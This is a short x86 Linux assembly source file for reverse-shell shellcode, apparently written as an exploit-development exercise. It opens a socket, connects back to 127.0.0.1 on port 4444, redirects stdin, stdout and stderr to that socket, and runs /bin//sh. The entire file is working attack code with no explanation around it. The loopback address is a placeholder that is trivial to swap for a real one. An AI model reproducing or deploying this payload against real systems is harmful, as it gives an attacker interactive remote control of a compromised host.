
section .text
        global _start

_start:
_create_socket:
        mov eax, 0x66 ; socketcall
        mov ebx, 1  ; SYS_SOCKET
        mov edx, 0
        push edx
        push ebx
        push 0x2
        mov ecx, esp
        int 80h ; sys_socket
        xchg edx, eax

_connect:
        mov eax, 0x66
        push 0x0101017f ; 127.0.0.1
        push word 0x5c11 ; 4444
        mov ebx, 0x02
        push word bx
        mov ecx, esp
        push 0x10
        push ecx
        push edx
        mov ecx, esp
        inc ebx
        int 80h ; sys_connect

        mov ecx, 2
        xchg ebx, edx


_redirect:
        mov al, 0x3f
        int 80h ; sys_dup2 for stdin, stdout then stderror
        dec ecx
        jns _redirect


_launch:
        mov al, 0x0b
        mov ecx, 0
        mov edx, 0
        push 0x00
        push 0x68732f2f ; "hs//"
        push 0x6e69622f ; "nib/
        mov ebx, esp
        int 80h


_exit:
        mov eax, 1
        mov ebx,  0
        int 80h

